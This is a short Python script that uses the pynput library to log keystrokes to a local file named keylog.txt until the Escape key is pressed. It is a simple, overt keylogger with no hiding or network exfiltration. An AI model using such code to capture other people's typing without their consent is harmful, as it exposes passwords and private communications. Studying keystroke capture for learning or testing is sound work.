from pynput.keyboard import Key, Listener

# Initialize a string to store the captured keystrokes
log = ""


# Define the on_press function to capture each keystroke
def key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == Key.space:
            log += ' '
        elif key == Key.enter:
            log += '\n'
        else:
            # log += ' ' + str(key) + ' '
            pass


# Define the on_release function to stop logging when the escape key is pressed
def key_release(key):
    if key == Key.esc:
        # Write the log to a file before exiting
        with open("keylog.txt", "w") as f:
            f.write(log)
        return False


# Set up the listener
with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()
